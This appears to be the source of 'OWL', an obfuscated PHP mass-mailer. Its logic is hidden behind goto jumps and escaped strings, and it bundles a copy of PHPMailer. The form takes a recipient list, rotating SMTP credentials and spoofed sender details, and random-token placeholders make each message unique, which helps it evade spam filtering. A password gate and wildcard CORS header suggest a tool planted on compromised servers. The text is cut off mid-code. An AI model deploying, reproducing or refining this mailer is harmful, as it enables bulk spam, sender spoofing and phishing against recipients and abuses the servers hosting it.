<?php
 goto L4yUo; iyraa: $password = ''; goto f0WNY; IWUWX: session_start(); goto la62l; aOisE: if (isset($_POST["\x61\143\x74\x69\x6f\x6e"]) && $_POST["\141\143\164\151\157\156"] == "\x73\x65\x6e\x64") { $GLOBALS["\162\x65\143\x69\160\x69\145\156\x74"] = owlTrim($_POST["\x72\x65\143\151\x70\151\145\x6e\x74"]); $GLOBALS["\x73\155\x74\x70\x41\143\x63\164"] = owlTrim($_POST["\x73\155\x74\160\101\143\143\x74"]); $GLOBALS["\163\145\156\144\x65\162\x4e\x61\x6d\145"] = owlTrim($_POST["\x73\x65\156\x64\x65\x72\116\141\155\145"]); $GLOBALS["\163\145\x6e\144\151\156\147\115\x65\x74\x68\157\x64"] = owlTrim($_POST["\x73\145\x6e\144\151\x6e\x67\115\145\164\150\157\144"]); $GLOBALS["\x73\x65\x6e\144\145\x72\105\155\x61\x69\154"] = owlTrim($_POST["\x73\145\156\x64\145\x72\x45\x6d\x61\151\154"]); $GLOBALS["\x72\145\x70\154\171\x54\x6f"] = owlTrim($_POST["\x72\x65\x70\154\171\x54\x6f"]); $messageLetter = owlTrim($_POST["\155\145\163\x73\x61\147\x65\x4c\145\x74\164\x65\x72"]); $messageLetter = urlencode($messageLetter); $messageLetter = preg_replace("\x2f\x25\65\x43\45\62\x32\x2f", "\x25\62\x32", $messageLetter); $messageLetter = urldecode($messageLetter); $GLOBALS["\155\x65\x73\x73\x61\147\145\x4c\145\164\x74\x65\162"] = stripslashes($messageLetter); $altMessageLetter = owlTrim($_POST["\x61\154\164\115\x65\x73\x73\x61\x67\x65\114\145\x74\164\145\x72"]); $altMessageLetter = urlencode($altMessageLetter); $altMessageLetter = preg_replace("\57\x25\x35\103\x25\62\x32\x2f", "\x25\x32\62", $altMessageLetter); $altMessageLetter = urldecode($altMessageLetter); $GLOBALS["\141\154\x74\x4d\145\163\163\141\x67\x65\x4c\x65\164\x74\x65\x72"] = stripslashes($altMessageLetter); $GLOBALS["\155\x65\163\x73\141\x67\145\x54\x79\x70\x65"] = owlTrim($_POST["\x6d\x65\x73\x73\x61\x67\x65\x54\171\x70\x65"]); $encodingType = owlTrim($_POST["\145\x6e\143\x6f\144\151\156\147\x54\x79\160\x65"]); $GLOBALS["\x65\156\143\x6f\144\151\x6e\x67\x54\x79\160\x65"] = stripslashes($encodingType); $emailPriority = owlTrim($_POST["\x65\x6d\x61\151\154\x50\162\151\x6f\x72\151\x74\171"]); $GLOBALS["\x65\x6d\141\151\154\x50\x72\x69\157\162\x69\x74\171"] = stripslashes($emailPriority); $messageSubject = owlTrim($_POST["\155\145\x73\x73\x61\147\x65\123\x75\142\152\x65\x63\164"]); $GLOBALS["\155\x65\x73\163\x61\147\145\x53\165\142\x6a\145\x63\x74"] = stripslashes($messageSubject); processEmailSendingRequest(); } goto TpX23; aG_Wj: ?>
)</li>
                <li>[-emailuser-] : <b>Email User</b> (emailuser@emaildomain)</li>
                <li>[-randomstring-] : <b>Random string (0-9,a-z)</b></li>
                <li>[-randomnumber-] : <b>Random number (0-9) </b></li>
                <li>[-randomletters-] : <b>Random Letters(a-z) </b></li>
                <li>[-randommd5-] : <b>Random MD5 </b></li>
            </ul>
            <h4>example</h4>
            Reciver Email = <b>user@domain.com</b><br>
            <ul>
                <li>hello <b>[-emailuser-]</b> -> hello <b>user</b></li>
                <li>your code is  <b>[-randommd5-]</b> -> your code is <b>e10adc3949ba59abbe56e057f20f883e</b></li>
            </ul>
            <h6>by <b><a href="http://<?php  goto vWRxO; N95yQ: ?>
"><?php  goto Zplg0; UBND1: header("\101\x63\143\x65\x73\x73\x2d\103\x6f\x6e\164\x72\x6f\x6c\x2d\x41\x6c\x6c\x6f\x77\55\117\162\x69\x67\151\x6e\72\x20\x2a"); goto iyraa; mobHu: ?>
</small></h3>
    <div class="row">
      <div class="form-group col-lg-6 ">
        <label for="senderEmail">Sender Email</label>
        <input type="text" class="form-control  input-sm" id="senderEmail" name="senderEmail">
      </div>
      <div class="form-group col-lg-6 ">
        <label for="senderEmail">Sender Name</label>
        <input type="text" class="form-control  input-sm" id="senderName" name="senderName">
      </div>
    </div>
    <div class="row"> <span class="form-group col-lg-6"><label for="attachment">Attachment <small>(Multiple Available)</small></label><input type="file" name="attachment[]" id="attachment" multiple/></span>
      <div class="form-group col-lg-6">
        <label for="replyTo">Reply-to</label>
        <input type="text" class="form-control  input-sm " id="replyTo" name="replyTo" />
      </div>
    </div>
    <div class="row">
      <div class="form-group col-lg-12 ">
        <label for="subject">Subject</label>
        <input type="text" class="form-control  input-sm " id="subject" name="subject" />
      </div>
    </div>
    <div class="row">
      <div class="form-group col-lg-6">
        <label for="messageLetter">Message Letter</label>
        <textarea placeholder="Message Letter" name="messageLetter" id="messageLetter" class="form-control" rows="10" id="textArea"></textarea>
      </div>
      <div class="form-group col-lg-6">
        <label for="altMessageLetter">Alternative Message Letter</label>
        <textarea placeholder="Alternative Message Letter.&#10;This body can be read by mail clients that do not have HTML email.&#10;capability such as mutt &#38; Eudora.&#10;Clients that can read HTML will view the normal Body." name="altMessageLetter" id="altMessageLetter" class="form-control" rows="10" id="textArea"></textarea>
      </div>
    </div>
    <div class="row">
      <div class="form-group col-lg-6 ">
        <label for="emailList">Email List</label>
        <textarea name="emailList" id="emailList" class="form-control" rows="10" id="textArea"></textarea>
      </div>
      <div class="form-group col-lg-6 ">
        <label for="smtpAccounts">SMTP Accounts</label>
        <textarea placeholder="Random account will be used when sending a message.&#10;1) Format: HOST:PORT:SSL&#10;2) Format: HOST:PORT:SSL:Username:Password&#10;Example: smtp.gmail.com:587:tls:xx@gmail.com:123&#10;Example: smtp.gmail.com:587:nossl:xx@gmail.com:123&#10;&#10;SSL Options: tls , ssl, nossl" name="smtpAccounts" id="smtpAccounts" class="form-control" rows="10" id="textArea"></textarea>
      </div>
    </div>

    <div class="row">
      <div class="form-group col-lg-6 ">
      <label for="messageType">Message Type</label>
      <input type="radio" name="messageType" id="messageType" value="html" checked> HTML
      <input type="radio" name="messageType" id="messageType" value="plain"> Plain
    </div>
    <div class="form-group col-lg-6 ">
      <label for="sendingMethod">Sending Method</label>
      <input type="radio" name="sendingMethod" id="sendingMethod" value="builtin" checked> Builtin
      <input type="radio" name="sendingMethod" id="sendingMethod" value="smtp"> SMTP
    </div>
    <div class="form-group col-lg-6">
      <label for="encoding">Encoding Type</label>
      <select class="form-control input-sm" id="encoding" name="encoding">
        <option value="UTF-8" selected>UTF-8 International Unicode</option>
        <option value="ISO-8859-1">ISO-8859-1 Latin 1 (West European)</option>
        <option value="ISO-8859-2">ISO-8859-2 Latin 2 (East European)</option>
        <option value="ISO-8859-3">ISO-8859-3 Latin 3 (South European)</option>
        <option value="ISO-8859-4">ISO-8859-4 Latin 4 (North European)</option>
        <option value="ISO-8859-5">ISO-8859-5 Cyrillic</option>
        <option value="ISO-8859-6">ISO-8859-6 Arabic</option>
        <option value="ISO-8859-7">ISO-8859-7 Greek</option>
        <option value="ISO-8859-8">ISO-8859-8 Hebrew</option>
        <option value="ISO-8859-9">ISO-8859-9 Latin 5 (Turkish)</option>
        <option value="ISO-8859-15">ISO-8859-15 Latin 9</option>
        <option value="BIG5">BIG5 Traditional Chinese</option>
        <option value="GB-2312">GB-2312 Simplified Chinese</option>
        <option value="ISO-2022-JP">ISO-2022-JP Japanese</option>
        <option value="EUC-JP">EUC-JP Japanese</option>
        <option value="Shift-JIS">Shift-JIS Japanese</option>
        <option value="KSC-5601">KSC-5601 Korean</option>
        <option value="EIC-KR">EIC-KR Korean</option>
      </select>
    </div>
    <div class="form-group col-lg-3">
      <label for="priority">Email Priority</label>
      <select class="form-control input-sm" id="priority" name="priority">
        <option value="" selected>Default</option>
        <option value="5">Low</option>
        <option value="3">Normal</option>
        <option value="1">High</option>
      </select>
    </div>
  </div>

<button type="button" id="btnStart" class="btn btn-default btn-sm" onclick="startSending();">Start</button>
<button type="button"id="btnStop" class="btn btn-default btn-sm" onclick="stopSending();">Stop</button>

</div>
  
    <div class="col-lg-6"><br>
        <label for="well">Instruction</label>
        <div id="well" class="well well">
            <h4>Server Information</h4>
            <ul>
                <li>ServerIP : <b> <?php  goto uuH_v; f0WNY: $owl["\x76\145\162\163\151\x6f\x6e"] = "\x31\56\x36"; goto Oa1bo; wneZg: function owlClear($text, $email) { $emailuser = preg_replace("\x2f\50\133\136\100\135\x2a\x29\x2e\x2a\57", "\x24\x31", $email); $text = str_replace("\133\55\x74\x69\155\x65\x2d\135", date("\x6d\57\x64\x2f\x59\x20\x68\72\x69\x3a\163\x20\141", time()), $text); $text = str_replace("\x5b\x2d\145\155\141\x69\154\x2d\135", $email, $text); $text = str_replace("\x5b\x2d\145\155\141\151\154\165\x73\x65\x72\55\x5d", $emailuser, $text); $text = str_replace("\133\55\162\141\156\x64\157\155\154\x65\164\x74\145\162\x73\x2d\135", randString("\x61\142\143\144\x65\146\147\150\151\x6a\153\x6c\x6d\x6e\x6f\160\x71\162\x73\x74\x75\x76\167\170\x79\172", 8, 15), $text); $text = str_replace("\x5b\x2d\x72\141\156\x64\157\155\163\x74\162\x69\x6e\147\55\135", randString("\141\142\143\144\145\146\x67\150\x69\x6a\x6b\x6c\155\x6e\157\160\x71\162\163\164\x75\x76\167\170\x79\x7a\x30\61\x32\x33\x34\x35\x36\x37\70\x39", 8, 15), $text); $text = str_replace("\133\55\x72\x61\156\x64\x6f\x6d\156\x75\x6d\142\145\x72\55\135", randString("\60\61\x32\63\x34\x35\66\67\x38\x39", 7, 15), $text); $text = str_replace("\x5b\55\162\x61\x6e\x64\157\x6d\155\x64\x35\x2d\x5d", md5(rand()), $text); return $text; } goto Lyzh3; rJMzV: ini_set("\155\145\x6d\x6f\x72\171\137\x6c\x69\155\x69\164", -1); goto xiAB8; H6Qfr: class phpmailerException extends Exception { public function errorMessage() { $errorMsg = "\74\163\164\162\157\156\x67\x3e" . $this->getMessage() . "\x3c\x2f\163\164\x72\x6f\156\x67\x3e\74\x62\162\40\57\76\12"; return $errorMsg; } } goto sgTAS; L4yUo: ?>
<title>OWL</title><?php  goto IWUWX; sHwL5: header("\x43\x61\143\150\x65\55\x43\157\x6e\164\x72\x6f\154\x3a\40\x70\157\163\164\55\x63\x68\145\x63\153\x3d\60\54\40\x70\162\x65\55\x63\150\x65\x63\153\75\x30", false); goto y1jaN; Ulz9w: if (!empty($password) && $_SESSION[$sessioncode] != $password) { if (isset($_REQUEST["\x70\141\163\x73"]) and $_REQUEST["\x70\x61\163\x73"] == $password) { $_SESSION[$sessioncode] = $password; } else { print "\x3c\x70\x72\145\x20\x61\x6c\151\x67\x6e\75\x63\x65\156\164\x65\162\x3e\x3c\146\157\x72\x6d\40\155\x65\164\x68\x6f\144\x3d\x70\x6f\163\x74\x3e\x50\141\x73\x73\167\x6f\162\x64\72\x20\74\x69\156\160\x75\164\x20\164\x79\x70\145\75\x27\x70\x61\x73\163\x77\x6f\162\x64\x27\40\x6e\x61\155\x65\x3d\x27\160\141\x73\163\x27\76\74\151\x6e\x70\x75\x74\x20\164\x79\160\x65\x3d\x27\x73\165\142\155\x69\164\x27\x20\166\141\154\x75\145\x3d\x27\76\76\47\x3e\74\x2f\146\x6f\x72\155\76\x3c\57\x70\x72\x65\76"; die; } } goto TVrrj; qvHOy: class PHPMailer { const CHARSET_ISO88591 = "\x69\x73\157\x2d\x38\70\x35\71\55\61"; const CHARSET_UTF8 = "\x75\164\146\x2d\x38"; const CONTENT_TYPE_PLAINTEXT = "\164\145\170\164\x2f\x70\x6c\x61\x69\x6e"; const CONTENT_TYPE_TEXT_CALENDAR = "\164\145\x78\x74\57\143\x61\154\x65\156\x64\x61\x72"; const CONTENT_TYPE_TEXT_HTML = "\x74\x65\x78\164\x2f\x68\x74\155\154"; const CONTENT_TYPE_MULTIPART_ALTERNATIVE = "\155\165\154\164\x69\160\141\162\164\x2f\141\x6c\164\x65\162\156\141\x74\151\166\145"; const CONTENT_TYPE_MULTIPART_MIXED = "\155\x75\x6c\x74\151\x70\141\x72\x74\x2f\x6d\151\170\x65\x64"; const CONTENT_TYPE_MULTIPART_RELATED = "\155\165\154\x74\x69\160\141\x72\x74\x2f\x72\145\154\141\164\x65\144"; const ENCODING_7BIT = "\67\142\151\x74"; const ENCODING_8BIT = "\x38\142\x69\164"; const ENCODING_BASE64 = "\142\x61\x73\145\x36\64"; const ENCODING_BINARY = "\x62\x69\x6e\x61\x72\x79"; const ENCODING_QUOTED_PRINTABLE = "\x71\x75\x6f\x74\145\x64\x2d\x70\x72\151\x6e\164\x61\x62\154\145"; public $Priority; public $CharSet = self::CHARSET_ISO88591; public $ContentType = self::CONTENT_TYPE_PLAINTEXT; public $Encoding = self::ENCODING_8BIT; public $ErrorInfo = ''; public $From = "\x72\x6f\157\164\100\x6c\x6f\143\141\x6c\150\x6f\x73\x74"; public $FromName = "\x52\x6f\157\164\40\x55\x73\x65\x72"; public $Sender = ''; public $Subject = ''; public $Body = ''; public $AltBody = ''; public $Ical = ''; protected $MIMEBody = ''; protected $MIMEHeader = ''; protected $mailHeader = ''; public $WordWrap = 0; public $Mailer = "\155\x61\151\154"; public $Sendmail = "\x2f\165\163\x72\57\x73\142\151\x6e\x2f\163\x65\x6e\x64\155\141\151\x6c"; public $UseSendmailOptions = true; public $ConfirmReadingTo = ''; public $Hostname = ''; public $MessageID = ''; public $MessageDate = ''; public $Host = "\x6c\x6f\143\141\x6c\150\x6f\163\x74"; public $Port = 25; public $Helo = ''; public $SMTPSecure = ''; public $SMTPAutoTLS = true; public $SMTPAuth = false; public $SMTPOptions = array(); public $Username = ''; public $Password = ''; public $AuthType = ''; protected $oauth; public $Timeout = 300; public $dsn = ''; public $SMTPDebug = 0; public $Debugoutput = "\145\143\x68\x6f"; public $SMTPKeepAlive = false; public $SingleTo = false; protected $SingleToArray = array(); public $do_verp = false; public $AllowEmpty = false; public $DKIM_selector = ''; public $DKIM_identity = ''; public $DKIM_passphrase = ''; public $DKIM_domain = ''; public $DKIM_copyHeaderFields = true; public $DKIM_extraHeaders = array(); public $DKIM_private = ''; public $DKIM_private_string = ''; public $action_function = ''; public $XMailer = ''; public static $validator = "\160\150\160"; protected $smtp; protected $to = array(); protected $cc = array(); protected $bcc = array(); protected $ReplyTo = array(); protected $all_recipients = array(); protected $RecipientsQueue = array(); protected $ReplyToQueue = array(); protected $attachment = array(); protected $CustomHeader = array(); protected $lastMessageID = ''; protected $message_type = ''; protected $boundary = array(); protected $language = array(); protected $error_count = 0; protected $sign_cert_file = ''; protected $sign_key_file = ''; protected $sign_extracerts_file = ''; protected $sign_key_pass = ''; protected $exceptions = false; protected $uniqueid = ''; const VERSION = "\66\56\x30\56\x37"; const STOP_MESSAGE = 0; const STOP_CONTINUE = 1; const STOP_CRITICAL = 2; protected static $LE = "\xd\12"; const MAX_LINE_LENGTH = 998; const STD_LINE_LENGTH = 76; public function __construct($exceptions = null) { if (null !== $exceptions) { $this->exceptions = (bool) $exceptions; } $this->Debugoutput = strpos(PHP_SAPI, "\x63\x6c\x69") !== false ? "\145\x63\150\157" : "\150\x74\x6d\x6c"; } public function __destruct() { $this->smtpClose(); } private function mailPassthru($to, $subject, $body, $header, $params) { if (ini_get("\x6d\x62\x73\164\162\151\x6e\147\x2e\146\x75\x6e\x63\x5f\x6f\166\x65\x72\x6c\x6f\x61\x64") & 1) { $subject = $this->secureHeader($subject); } else { $subject = $this->encodeHeader($this->secureHeader($subject)); } if (!$this->UseSendmailOptions or null === $params) { $result = @mail($to, $subject, $body, $header); } else { $result = @mail($to, $subject, $body, $header, $params); } return $result; } protected function edebug($str) { if ($this->SMTPDebug <= 0) { return; } if ($this->Debugoutput instanceof \Psr\Log\LoggerInterface) { $this->Debugoutput->debug($str); return; } if (!in_array($this->Debugoutput, array("\x65\x72\x72\x6f\x72\137\x6c\x6f\147", "\150\164\155\154", "\x65\x63\150\157")) and is_callable($this->Debugoutput)) { call_user_func($this->Debugoutput, $str, $this->SMTPDebug); return; } switch ($this->Debugoutput) { case "\145\x72\x72\157\162\x5f\x6c\x6f\x67": error_log($str); break; case "\150\x74\155\154": echo htmlentities(preg_replace("\x2f\x5b\x5c\162\134\x6e\x5d\x2b\57", '', $str), ENT_QUOTES, "\x55\124\106\55\x38"), "\x3c\142\x72\x3e\xa"; break; case "\x65\x63\150\157": default: $str = preg_replace("\57\x5c\162\134\156\x7c\x5c\x72\57\x6d\x73", "\xa", $str); echo gmdate("\x59\55\155\55\144\x20\110\72\151\72\163"), "\x9", trim(str_replace("\xa", "\xa\40\x20\x20\40\40\x20\40\40\40\40\x20\40\40\x20\40\40\40\40\40\11\x20\x20\40\x20\x20\x20\x20\x20\x20\x20\x20\40\40\40\40\40\40\x20", trim($str))), "\xa"; } } public function isHTML($isHtml = true) { if ($isHtml) { $this->ContentType = static::CONTENT_TYPE_TEXT_HTML; } else { $this->ContentType = static::CONTENT_TYPE_PLAINTEXT; } } public function isSMTP() { $this->Mailer = "\x73\155\x74\x70"; } public function isMail() { $this->Mailer = "\x6d\x61\151\x6c"; } public function isSendmail() { $ini_sendmail_path = ini_get("\x73\145\x6e\x64\155\x61\x69\154\x5f\x70\141\164\x68"); if (false === stripos($ini_sendmail_path, "\163\145\x6e\x64\155\x61\x69\154")) { $this->Sendmail = "\x2f\165\163\x72\x2f\163\142\151\156\57\x73\145\156\x64\x6d\141\151\x6c"; } else { $this->Sendmail = $ini_sendmail_path; } $this->Mailer = "\x73\x65\x6e\x64\x6d\x61\x69\x6c"; } public function isQmail() { $ini_sendmail_path = ini_get("\163\x65\156\144\x6d\141\151\154\137\160\141\x74\x68"); if (false === stripos($ini_sendmail_path, "\161\155\x61\x69\x6c")) { $this->Sendmail = "\x2f\x76\141\162\57\x71\155\x61\x69\x6c\57\142\151\156\57\x71\155\x61\151\x6c\x2d\151\156\x6a\145\143\164"; } else { $this->Sendmail = $ini_sendmail_path; } $this->Mailer = "\161\x6d\x61\x69\x6c"; } public function addAddress($address, $name = '') { return $this->addOrEnqueueAnAddress("\164\x6f", $address, $name); } public function addCC($address, $name = '') { return $this->addOrEnqueueAnAddress("\143\143", $address, $name); } public function addBCC($address, $name = '') { return $this->addOrEnqueueAnAddress("\142\x63\143", $address, $name); } public function addReplyTo($address, $name = '') { return $this->addOrEnqueueAnAddress("\x52\145\160\154\x79\x2d\x54\157", $address, $name); } protected function addOrEnqueueAnAddress($kind, $address, $name) { $address = trim($address); $name = trim(preg_replace("\x2f\x5b\134\x72\134\156\x5d\53\57", '', $name)); $pos = strrpos($address, "\100"); if (false === $pos) { $error_message = sprintf("\45\x73\40\x28\x25\163\51\x3a\x20\x25\x73", $this->lang("\x69\156\166\x61\154\151\x64\x5f\x61\144\x64\162\145\163\x73"), $kind, $address); $this->setError($error_message); $this->edebug($error_message); if ($this->exceptions) { throw new Exception($error_message); } return false; } $params = array($kind, $address, $name); if ($this->has8bitChars(substr($address, ++$pos)) and static::idnSupported()) { if ("\122\x65\x70\154\171\55\124\157" != $kind) { if (!array_key_exists($address, $this->RecipientsQueue)) { $this->RecipientsQueue[$address] = $params; return true; } } else { if (!array_key_exists($address, $this->ReplyToQueue)) { $this->ReplyToQueue[$address] = $params; return true; } } return false; } return call_user_func_array(array($this, "\x61\x64\x64\101\x6e\x41\x64\144\x72\x65\163\x73"), $params); } protected function addAnAddress($kind, $address, $name = '') { if (!in_array($kind, array("\x74\x6f", "\x63\143", "\142\x63\143", "\122\145\160\154\171\x2d\x54\157"))) { $error_message = sprintf("\45\x73\72\x20\45\x73", $this->lang("\x49\156\166\x61\x6c\151\144\x20\162\x65\x63\x69\x70\x69\x65\x6e\164\x20\153\x69\156\x64"), $kind); $this->setError($error_message); $this->edebug($error_message); if ($this->exceptions) { throw new Exception($error_message); } return false; } if (!static::validateAddress($address)) { $error_message = sprintf("\x25\163\40\x28\x25\163\x29\72\x20\45\163", $this->lang("\151\x6e\166\x61\x6c\151\x64\137\x61\144\144\x72\x65\163\x73"), $kind, $address); $this->setError($error_message); $this->edebug($error_message); if ($this->exceptions) { throw new Exception($error_message); } return false; } if ("\x52\145\160\154\x79\55\x54\157" != $kind) { if (!array_key_exists(strtolower($address), $this->all_recipients)) { $this->{$kind}[] = array($address, $name); $this->all_recipients[strtolower($address)] = true; return true; } } else { if (!array_key_exists(strtolower($address), $this->ReplyTo)) { $this->ReplyTo[strtolower($address)] = array($address, $name); return true; } } return false; } public static function parseAddresses($addrstr, $useimap = true) { $addresses = array(); if ($useimap and function_exists("\151\x6d\x61\160\x5f\x72\x66\143\70\x32\x32\137\160\141\162\163\x65\137\141\x64\x72\x6c\x69\x73\x74")) { $list = imap_rfc822_parse_adrlist($addrstr, ''); foreach ($list as $address) { if ("\56\x53\x59\x4e\x54\x41\x58\55\105\x52\x52\x4f\122\x2e" != $address->host) { if (static::validateAddress($address->mailbox . "\x40" . $address->host)) { $addresses[] = array("\x6e\141\x6d\145" => property_exists($address, "\160\145\x72\163\x6f\x6e\141\154") ? $address->personal : '', "\x61\x64\144\162\x65\x73\x73" => $address->mailbox . "\100" . $address->host); } } } } else { $list = explode("\54", $addrstr); foreach ($list as $address) { $address = trim($address); if (strpos($address, "\74") === false) { if (static::validateAddress($address)) { $addresses[] = array("\x6e\141\155\145" => '', "\141\x64\144\162\x65\163\x73" => $address); } } else { list($name, $email) = explode("\x3c", $address); $email = trim(str_replace("\x3e", '', $email)); if (static::validateAddress($email)) { $addresses[] = array("\x6e\x61\x6d\145" => trim(str_replace(array("\x22", "\47"), '', $name)), "\x61\144\x64\x72\x65\163\x73" => $email); } } } } return $addresses; } public function setFrom($address, $name = '', $auto = true) { $address = trim($address); $name = trim(preg_replace("\57\133\134\162\x5c\x6e\135\x2b\57", '', $name)); $pos = strrpos($address, "\100"); if (false === $pos or (!$this->has8bitChars(substr($address, ++$pos)) or !static::idnSupported()) and !static::validateAddress($address)) { $error_message = sprintf("\45\x73\40\x28\106\162\157\x6d\x29\72\40\x25\x73", $this->lang("\151\156\x76\141\154\151\x64\x5f\141\144\x64\x72\x65\163\x73"), $address); $this->setError($error_message); $this->edebug($error_message); if ($this->exceptions) { throw new Exception($error_message); } return false; } $this->From = $address; $this->FromName = $name; if ($auto) { if (empty($this->Sender)) { $this->Sender = $address; } } return true; } public function getLastMessageID() { return $this->lastMessageID; } public static function validateAddress($address, $patternselect = null) { if (null === $patternselect) { $patternselect = static::$validator; } if (is_callable($patternselect)) { return call_user_func($patternselect, $address); } if (strpos($address, "\xa") !== false or strpos($address, "\xd") !== false) { return false; } switch ($patternselect) { case "\x70\143\162\145": case "\160\x63\162\x65\70": return (bool) preg_match("\x2f\x5e\x28\77\41\50\x3f\76\50\x3f\61\x29\x22\77\x28\x3f\76\x5c\x5c\133\40\x2d\x7e\x5d\x7c\133\x5e\x22\135\x29\x22\77\x28\77\61\x29\51\x7b\x32\65\65\54\x7d\51\50\77\41\50\77\x3e\50\77\x31\x29\x22\77\50\77\x3e\134\x5c\x5b\x20\55\x7e\x5d\x7c\x5b\136\42\x5d\51\x22\x3f\50\x3f\x31\51\x29\173\66\65\x2c\175\x40\x29" . "\50\50\x3f\76\50\x3f\76\50\x3f\x3e\x28\50\77\76\50\77\76\50\x3f\x3e\x5c\x78\60\104\x5c\x78\x30\101\x29\77\133\134\164\x20\135\x29\53\174\50\77\x3e\x5b\x5c\x74\x20\135\x2a\134\170\x30\104\x5c\170\60\101\51\x3f\x5b\134\164\40\x5d\x2b\51\77\x29\x28\x5c\x28\x28\77\x3e\50\x3f\62\51" . "\x28\x3f\x3e\133\134\x78\60\x31\55\134\170\60\x38\x5c\170\x30\x42\x5c\x78\x30\103\134\x78\x30\105\55\x27\52\55\x5c\133\x5c\x5d\55\134\170\67\x46\135\x7c\x5c\134\133\x5c\x78\x30\x30\55\x5c\170\x37\x46\135\174\x28\x3f\x33\51\51\x29\52\x28\77\62\51\134\x29\51\x29\53\x28\x3f\x32\x29\x29\x7c\x28\x3f\62\x29\x29\x3f\x29" . "\x28\x5b\x21\x23\x2d\x27\52\x2b\x5c\x2f\55\71\x3d\x3f\x5e\x2d\x7e\x2d\135\x2b\x7c\42\50\77\x3e\x28\x3f\x32\51\x28\77\76\x5b\134\x78\x30\61\55\134\x78\60\x38\x5c\170\60\102\134\x78\x30\103\x5c\x78\60\105\x2d\41\43\x2d\134\133\134\x5d\x2d\134\x78\x37\106\x5d\174\134\x5c\133\134\x78\x30\60\x2d\134\x78\67\106\135\51\x29\x2a" . "\50\77\62\x29\x22\x29\50\x3f\76\x28\x3f\61\x29\134\56\50\x3f\61\x29\50\77\64\51\51\x2a\x28\77\x31\x29\x40\x28\77\41\x28\x3f\61\x29\x5b\141\x2d\172\x30\x2d\x39\55\x5d\173\66\64\54\175\x29\x28\77\61\x29\50\x3f\76\x28\133\141\x2d\172\x30\x2d\x39\x5d\50\x3f\x3e\x5b\x61\55\172\x30\x2d\71\55\x5d\52\x5b\x61\55\x7a\x30\55\71\x5d\x29\77\x29" . "\x28\77\x3e\50\x3f\61\x29\134\56\50\x3f\x21\50\x3f\61\x29\133\x61\55\172\x30\x2d\x39\x2d\135\x7b\x36\x34\54\175\51\x28\77\x31\51\x28\x3f\65\51\51\173\x30\x2c\61\62\66\x7d\174\x5c\x5b\50\x3f\72\x28\x3f\76\111\120\166\66\72\50\x3f\x3e\x28\133\x61\55\146\60\x2d\x39\135\173\x31\x2c\64\x7d\51\x28\x3f\x3e\x3a\x28\x3f\66\51\x29\173\67\x7d" . "\174\x28\x3f\41\x28\77\x3a\56\x2a\x5b\x61\55\x66\60\x2d\x39\x5d\133\x3a\134\135\135\51\x7b\x38\x2c\175\x29\50\x28\77\x36\x29\50\77\76\x3a\x28\x3f\x36\51\51\173\60\x2c\x36\x7d\x29\x3f\72\72\50\77\x37\51\x3f\51\x29\x7c\x28\77\76\50\x3f\x3e\x49\120\166\x36\x3a\50\77\x3e\x28\x3f\x36\x29\50\77\x3e\72\50\x3f\66\51\51\x7b\65\175\72" . "\174\50\x3f\41\x28\x3f\x3a\56\x2a\x5b\141\x2d\x66\60\x2d\71\135\x3a\x29\x7b\x36\54\x7d\x29\x28\77\70\x29\x3f\72\x3a\50\x3f\76\50\50\77\66\x29\50\x3f\76\x3a\50\77\66\x29\51\x7b\x30\54\64\175\51\72\51\x3f\x29\51\77\x28\x32\x35\133\x30\x2d\65\x5d\x7c\62\133\60\55\x34\x5d\133\60\x2d\71\x5d\x7c\x31\x5b\x30\55\x39\x5d\173\62\175" . "\x7c\x5b\61\x2d\x39\x5d\x3f\x5b\60\55\71\135\51\50\77\76\x5c\56\x28\77\71\51\x29\x7b\x33\175\51\51\134\135\x29\50\x3f\x31\51\x24\57\x69\x73\x44", $address); case "\150\x74\155\154\x35": return (bool) preg_match("\x2f\x5e\x5b\x61\55\172\x41\55\x5a\x30\x2d\x39\56\x21\x23\x24\x25\46\x27\52\x2b\x5c\57\x3d\x3f\x5e\137\x60\x7b\174\x7d\176\55\135\x2b\x40\x5b\141\55\x7a\101\55\x5a\x30\55\x39\135\50\x3f\x3a\133\x61\x2d\x7a\101\x2d\132\60\55\71\55\x5d\173\x30\x2c\66\61\175" . "\x5b\141\x2d\x7a\x41\x2d\x5a\60\55\71\135\x29\x3f\50\x3f\x3a\x5c\x2e\133\141\x2d\172\x41\x2d\x5a\x30\x2d\x39\135\x28\x3f\x3a\x5b\x61\x2d\172\x41\x2d\132\x30\55\71\x2d\135\x7b\x30\x2c\x36\x31\x7d\133\x61\55\x7a\101\x2d\x5a\60\x2d\71\x5d\51\x3f\x29\x2a\x24\57\x73\104", $address); case "\x70\x68\x70": default: return (bool) filter_var($address, FILTER_VALIDATE_EMAIL); } } public static function idnSupported() { return function_exists("\x69\x64\x6e\137\164\x6f\137\x61\x73\143\x69\x69") and function_exists("\x6d\x62\x5f\143\157\156\166\x65\162\164\x5f\145\156\x63\x6f\x64\x69\156\x67"); } public function punyencodeAddress($address) { $pos = strrpos($address, "\x40"); if (static::idnSupported() and !empty($this->CharSet) and false !== $pos) { $domain = substr($address, ++$pos); if ($this->has8bitChars($domain) and @mb_check_encoding($domain, $this->CharSet)) { $domain = mb_convert_encoding($domain, "\x55\124\106\55\x38", $this->CharSet); $errorcode = 0; $punycode = idn_to_ascii($domain, $errorcode, INTL_IDNA_VARIANT_UTS46); if (false !== $punycode) { return substr($address, 0, $pos) . $punycode; } } } return $address; } public function send() { try { if (!$this->preSend()) { return false; } return $this->postSend(); } catch (Exception $exc) { $this->mailHeader = ''; $this->setError($exc->getMessage()); if ($this->exceptions) { throw $exc; } return false; } } public function preSend() { if ("\x73\x6d\x74\160" == $this->Mailer or "\155\141\151\154" == $this->Mailer and stripos(PHP_OS, "\x57\111\x4e") === 0) { static::setLE("\xd\xa"); } else { static::setLE(PHP_EOL); } if (ini_get("\155\141\151\x6c\56\141\144\x64\x5f\170\137\x68\x65\141\x64\145\162") == 1 and "\155\141\x69\x6c" == $this->Mailer and stripos(PHP_OS, "\127\111\x4e") === 0 and (version_compare(PHP_VERSION, "\x37\56\x30\56\x30", "\76\x3d") and version_compare(PHP_VERSION, "\x37\x2e\x30\56\61\x37", "\x3c") or version_compare(PHP_VERSION, "\x37\x2e\x31\56\60", "\76\75") and version_compare(PHP_VERSION, "\x37\x2e\61\56\x33", "\x3c"))) { trigger_error("\x59\x6f\x75\162\x20\x76\x65\162\163\x69\x6f\x6e\x20\157\146\x20\x50\110\x50\x20\151\163\x20\141\146\146\145\143\x74\x65\144\x20\x62\171\x20\x61\x20\142\x75\147\x20\164\150\141\164\40\x6d\141\x79\40\162\145\x73\x75\154\164\x20\x69\156\40\x63\157\x72\x72\x75\160\x74\145\x64\40\x6d\145\x73\163\141\147\145\163\x2e" . 